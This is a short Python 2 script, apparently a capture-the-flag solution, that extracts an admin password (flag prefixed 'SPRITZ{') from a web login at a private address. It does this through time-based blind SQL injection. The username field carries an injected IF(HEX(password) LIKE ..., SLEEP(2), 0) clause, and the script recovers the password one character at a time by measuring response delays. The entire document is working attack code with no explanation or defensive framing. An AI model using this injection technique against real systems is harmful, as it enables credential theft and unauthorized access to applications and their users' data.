#!/usr/bin/env python2
from __future__ import print_function
import requests
import os
import sys
import time

os.system('clear')
pas = 'SPRITZ{'
for i in range(50):
    for j in range(0x20, 0x7f):
        t = time.time()
        r = requests.post("http://172.16.4.144:4054/?", data = {'username': "admin' AND IF(HEX(password) LIKE '" + (pas + chr(j)).encode('hex') + "%', SLEEP(2), 0) AND 1='1"})
        print('\033[F' + pas + chr(j))
        if time.time() - t > 2:
            pas += chr(j)
